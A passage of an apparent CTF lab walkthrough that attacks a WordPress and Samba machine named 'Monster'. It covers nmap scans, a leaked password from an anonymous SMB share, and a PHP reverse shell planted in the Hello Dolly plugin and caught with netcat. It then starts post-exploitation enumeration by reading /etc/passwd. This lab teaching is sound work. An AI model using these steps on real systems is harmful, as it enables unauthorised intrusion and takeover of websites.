+</span></span><span style="display:flex;"><span>docker0: flags<span style="color:#f92672">=</span>4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
+</span></span><span style="display:flex;"><span>        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+</span></span><span style="display:flex;"><span>        ether 02:42:c7:14:f0:c0  txqueuelen <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX packets <span style="color:#ae81ff">0</span>  bytes <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>0.0 B<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        TX packets <span style="color:#ae81ff">0</span>  bytes <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>0.0 B<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">2</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>eth0: flags<span style="color:#f92672">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
+</span></span><span style="display:flex;"><span>        inet 192.168.106.128  netmask 255.255.255.0  broadcast 192.168.106.255
+</span></span><span style="display:flex;"><span>        inet6 fe80::4b6e:3699:9616:da69  prefixlen <span style="color:#ae81ff">64</span>  scopeid 0x20&lt;link&gt;
+</span></span><span style="display:flex;"><span>        ether 00:0c:29:8c:03:70  txqueuelen <span style="color:#ae81ff">1000</span>  <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX packets <span style="color:#ae81ff">152</span>  bytes <span style="color:#ae81ff">11602</span> <span style="color:#f92672">(</span>11.3 KiB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        TX packets <span style="color:#ae81ff">555</span>  bytes <span style="color:#ae81ff">34810</span> <span style="color:#f92672">(</span>33.9 KiB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">1</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>lo: flags<span style="color:#f92672">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span style="color:#ae81ff">65536</span>
+</span></span><span style="display:flex;"><span>        inet 127.0.0.1  netmask 255.0.0.0
+</span></span><span style="display:flex;"><span>        inet6 ::1  prefixlen <span style="color:#ae81ff">128</span>  scopeid 0x10&lt;host&gt;
+</span></span><span style="display:flex;"><span>        loop  txqueuelen <span style="color:#ae81ff">1000</span>  <span style="color:#f92672">(</span>Local Loopback<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX packets <span style="color:#ae81ff">44</span>  bytes <span style="color:#ae81ff">2796</span> <span style="color:#f92672">(</span>2.7 KiB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        TX packets <span style="color:#ae81ff">44</span>  bytes <span style="color:#ae81ff">2796</span> <span style="color:#f92672">(</span>2.7 KiB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>Attack-box IP (eth0): 192.168.106.128</p>
+<p>To identify the target machine IP, run a host discovery scan.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap 192.168.106.0/24 -sn 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-03-10 23:54 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.106.1
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00042s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>MAC Address: 00:50:56:C0:00:01 <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.106.129
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00057s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>MAC Address: 00:0C:29:25:F6:2F <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.106.254
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00022s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>MAC Address: 00:50:56:E4:DC:88 <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.106.128
+</span></span><span style="display:flex;"><span>Host is up.
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">256</span> IP addresses <span style="color:#f92672">(</span><span style="color:#ae81ff">4</span> hosts up<span style="color:#f92672">)</span> scanned in 12.43 seconds
+</span></span></code></pre></div><p>Target machine IP: 192.168.106.129</p>
+<h2 id="service-discovery">Service discovery<a hidden class="anchor" aria-hidden="true" href="#service-discovery">#</a></h2>
+<p>Run an initial Nmap scan to discover open ports on the target IP.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap 192.168.106.129 -sV -oN initial.txt    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh         OpenSSH 10.0p2 Ubuntu 5ubuntu5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http        Apache httpd 2.4.64 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn Samba smbd <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>445/tcp open  netbios-ssn Samba smbd <span style="color:#ae81ff">4</span>
+</span></span></code></pre></div><p>We discover four open ports: 22, 80, 139, and 445.</p>
+<p>Continue with default scripts to gather more service information.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap 192.168.106.129 -sV -sC -oN second.txt            
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh         OpenSSH 10.0p2 Ubuntu 5ubuntu5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http        Apache httpd 2.4.64 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-generator: WordPress 6.9.1
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.64 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Monster
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn Samba smbd <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>445/tcp open  netbios-ssn Samba smbd <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>MAC Address: 00:0C:29:25:F6:2F <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: -1h27m26s
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2026-03-11T02:39:13
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: MONSTER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3.1.1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span></code></pre></div><p>From the scan, we can conclude that the Linux target is running SSH, HTTP, and SMB. The website is using WordPress.</p>
+<p>SMB is a good place to start because shared folders often contain useful information.</p>
+<h3 id="enumerating-smb">Enumerating SMB<a hidden class="anchor" aria-hidden="true" href="#enumerating-smb">#</a></h3>
+<p>We can list SMB shares if the service accepts guest login.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L //192.168.106.129 -N
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span>        print$          Disk      Printer Drivers
+</span></span><span style="display:flex;"><span>        publicshare     Disk      
+</span></span><span style="display:flex;"><span>        IPC$            IPC       IPC Service <span style="color:#f92672">(</span>monster server <span style="color:#f92672">(</span>Samba, Ubuntu<span style="color:#f92672">))</span>
+</span></span></code></pre></div><p>The server accepts guest login.</p>
+<p>We find <code>publicshare</code>, which is not a default share.</p>
+<p>Try connecting to <code>publicshare</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //192.168.106.129/publicshare -N
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Thu Mar  <span style="color:#ae81ff">5</span> 10:42:02 <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Mar  <span style="color:#ae81ff">5</span> 10:42:02 <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>  note.txt                            N       <span style="color:#ae81ff">98</span>  Thu Mar  <span style="color:#ae81ff">5</span> 10:40:59 <span style="color:#ae81ff">2026</span>
+</span></span></code></pre></div><p>Use <code>ls</code> to list files in the share.</p>
+<p>The share contains <code>note.txt</code>. Download and read it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get note.txt
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\n</span>ote.txt of size <span style="color:#ae81ff">98</span> as note.txt <span style="color:#f92672">(</span>13.7 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 13.7 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> quit
+</span></span><span style="display:flex;"><span>cat note.txt
+</span></span><span style="display:flex;"><span>Dear gempa,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Here is your default password <span style="color:#e6db74">&#34;KUasa#lemt4l&#34;</span>. Please change it later.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>From: boboyot
+</span></span></code></pre></div><p>We found credentials in SMB, but we still need to find where to use them.</p>
+<p>Next, enumerate the web service.</p>
+<h3 id="enumerating-website">Enumerating website<a hidden class="anchor" aria-hidden="true" href="#enumerating-website">#</a></h3>
+<p>Open the website in a browser.</p>
+<p><img alt="Monster Corporate WordPress homepage" loading="lazy" src="/blog/posts/monster-corporate/monster-corporate-02.png"></p>
+<p>Just a normal blog, nothing interesting here.</p>
+<p>Since we know the website is using WordPress, we can directly access <code>wp-login.php</code>.</p>
+<p>If you do not know the endpoint, fuzz the site with a tool such as <code>dirsearch</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dirsearch -u http://192.168.106.129                                                     
+</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+</span></span><span style="display:flex;"><span>  from pkg_resources import DistributionNotFound, VersionConflict
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  _|. _ _  _  _  _ _|_    v0.4.3
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">(</span>_<span style="color:#f92672">||</span>| _<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>/_<span style="color:#f92672">(</span>_<span style="color:#f92672">||</span> <span style="color:#f92672">(</span>_| <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span style="color:#ae81ff">25</span> | Wordlist size: <span style="color:#ae81ff">11460</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Output File: /home/kali/Desktop/ctf/26-divideCTF/reports/http_192.168.106.129/_26-03-11_00-31-43.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://192.168.106.129/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:44<span style="color:#f92672">]</span> Starting: 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.ht_wsr.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.htaccess.bak1
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.htaccess.sample
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.htaccess.save
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.htaccess.orig
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.htaccess_orig
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.htaccess_sc
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.htaccess_extra
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.htaccessBAK
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.htaccessOLD
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.htaccessOLD2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.htm
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.html
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.htpasswd_test
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.htpasswds
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:45<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.httr-oauth
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:47<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:56<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -    0B  - /index.php  -&gt;  http://192.168.106.129/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:56<span style="color:#f92672">]</span> <span style="color:#ae81ff">404</span> -   66KB - /index.php/login/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:31:57<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    7KB - /license.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:01<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    3KB - /readme.html
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:02<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /server-status
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:02<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  280B  - /server-status/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:06<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  321B  - /wp-admin  -&gt;  http://192.168.106.129/wp-admin/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:06<span style="color:#f92672">]</span> <span style="color:#ae81ff">400</span> -    1B  - /wp-admin/admin-ajax.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:06<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -    0B  - /wp-admin/  -&gt;  http://192.168.106.129/wp-login.php?redirect_to<span style="color:#f92672">=</span>http%3A%2F%2F192.168.106.129%2Fwp-admin%2F&amp;reauth<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:06<span style="color:#f92672">]</span> <span style="color:#ae81ff">409</span> -    3KB - /wp-admin/setup-config.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:06<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  505B  - /wp-admin/install.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:06<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /wp-config.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:06<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  323B  - /wp-content  -&gt;  http://192.168.106.129/wp-content/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:06<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /wp-content/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:06<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   84B  - /wp-content/plugins/akismet/akismet.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:06<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /wp-content/plugins/hello.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:06<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  458B  - /wp-content/uploads/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:07<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  324B  - /wp-includes  -&gt;  http://192.168.106.129/wp-includes/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:07<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /wp-includes/rss-functions.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:07<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    0B  - /wp-cron.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:07<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    4KB - /wp-includes/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:07<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /wp-login.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:07<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -    0B  - /wp-signup.php  -&gt;  http://192.168.106.129/wp-login.php?action<span style="color:#f92672">=</span>register
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>00:32:07<span style="color:#f92672">]</span> <span style="color:#ae81ff">405</span> -   42B  - /xmlrpc.php
+</span></span></code></pre></div><p>Go to <code>wp-login.php</code> and test the credentials found earlier.</p>
+<p><img alt="WordPress login page" loading="lazy" src="/blog/posts/monster-corporate/monster-corporate-03.png"></p>
+<p>From the <code>note.txt</code> file found earlier:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Dear gempa,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Here is your default password <span style="color:#e6db74">&#34;KUasa#lemt4l&#34;</span>. Please change it later.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>From: boboyot
+</span></span></code></pre></div><p>Log in with username <code>gempa</code> and password <code>KUasa#lemt4l</code>.</p>
+<p><img alt="Successful WordPress admin login" loading="lazy" src="/blog/posts/monster-corporate/monster-corporate-04.png"></p>
+<p>Good news: the credentials work for wp-admin.</p>
+<p>Next, check what permissions the <code>gempa</code> user has.</p>
+<p><img alt="WordPress admin dashboard user permissions" loading="lazy" src="/blog/posts/monster-corporate/monster-corporate-05.png"></p>
+<h2 id="initial-foothold-1">Initial foothold<a hidden class="anchor" aria-hidden="true" href="#initial-foothold-1">#</a></h2>
+<p>The <code>gempa</code> user is a WordPress administrator. To get the initial foothold, we can use plugin editing to achieve RCE.</p>
+<p><img alt="WordPress plugins page" loading="lazy" src="/blog/posts/monster-corporate/monster-corporate-06.png"></p>
+<p>There are two inactive plugins. I use Hello Dolly.</p>
+<p>Activate the plugin first.</p>
+<p>Then go to Tools, open Plugin File Editor, select Hello Dolly from the top-right dropdown, and click Select.</p>
+<p><img alt="Selecting Hello Dolly in the plugin file editor" loading="lazy" src="/blog/posts/monster-corporate/monster-corporate-07.png"></p>
+<p>Then use a PHP reverse shell payload to get a shell. I generated the payload with <a href="http://revshells.com">revshells.com</a>.</p>
+<p><img alt="Generating a PHP reverse shell payload" loading="lazy" src="/blog/posts/monster-corporate/monster-corporate-08.png"></p>
+<p>Set your attack-box IP address and port to listen.</p>
+<p>Copy the PHP code, paste it into the <code>hello.php</code> editor, and update the file.</p>
+<p><img alt="Pasting the reverse shell payload into hello.php" loading="lazy" src="/blog/posts/monster-corporate/monster-corporate-09.png"></p>
+<p>Before executing the shell, set up a listener on the port used in the payload.</p>
+<p>I use port 8888 with netcat.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">8888</span>                               
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8888</span> ...
+</span></span></code></pre></div><p>The listener is ready. Now execute the payload.</p>
+<p>Navigate to <a href="http://192.168.106.129/wp-content/plugins/hello.php">http://192.168.106.129/wp-content/plugins/hello.php</a> to trigger the shell.</p>
+<p>If you are unsure where this path came from, check the <code>dirsearch</code> result from earlier.</p>
+<p><img alt="Triggering the Hello Dolly payload path" loading="lazy" src="/blog/posts/monster-corporate/monster-corporate-10.png"></p>
+<p>If the browser request hangs, check your listener.</p>
+<p>The listener receives a reverse shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">8888</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8888</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>192.168.106.128<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.106.129<span style="color:#f92672">]</span> <span style="color:#ae81ff">33024</span>
+</span></span><span style="display:flex;"><span>Linux monster 6.17.0-14-generic <span style="color:#75715e">#14-Ubuntu SMP PREEMPT_DYNAMIC Fri Jan  9 17:01:16 UTC 2026 x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span> 15:20:39 up <span style="color:#ae81ff">28</span> min,  <span style="color:#ae81ff">0</span> users,  load average: 0.15, 0.17, 0.14
+</span></span><span style="display:flex;"><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1902<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@monster:/$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span><span style="display:flex;"><span>www-data@monster:/$ 
+</span></span></code></pre></div><p>We now have a shell as <code>www-data</code>.</p>
+<h2 id="lateral-movement-1">Lateral movement<a hidden class="anchor" aria-hidden="true" href="#lateral-movement-1">#</a></h2>
+<p>Usually, <code>www-data</code> does not have enough privileges, so we need to escalate.</p>
+<p>For post-exploitation enumeration, you can use LinPEAS, but I will show the manual path first.</p>
+<p>After entering the system, gather as much useful information as possible.</p>
+<p>Basic checklist:</p>
+<ul>
+<li>another system user</li>
+<li>sudo -l</li>
+<li>SUID</li>
+<li>cronjob</li>
+<li>any misconfigured binary</li>
+</ul>
+<p>Find other users on the system.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/passwd
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>boboyot:x:1000:1000:boboyot:/home/boboyot:/bin/bash
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Look for users with a shell, or list the <code>/home</code> directory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -la /home
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
